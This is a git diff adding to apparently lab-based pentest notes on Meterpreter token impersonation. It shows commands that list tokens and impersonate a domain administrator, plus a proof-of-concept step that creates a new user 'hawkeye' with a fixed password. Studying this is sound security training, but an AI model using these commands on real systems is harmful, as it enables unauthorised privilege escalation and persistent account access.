@@ -33,6 +33,21 @@ meterpreter > revself
 ![](https://i.imgur.com/lPsa2e1.png)
 
 ```powershell
-
+meterpreter > list_tokens -u
+# impersonate_token domain\\user
+meterpreter > impersonate_token marvel\\administrator
 ```
+
+
+
+#### **Example**
+
+
+![](https://i.imgur.com/hc1UK5y.png)
+
+
+
+## **Proof Of Concept**
+
+We can add a proof of concept to our report by creating a new user, called **hawkeye** with password as **Password1@**.
 
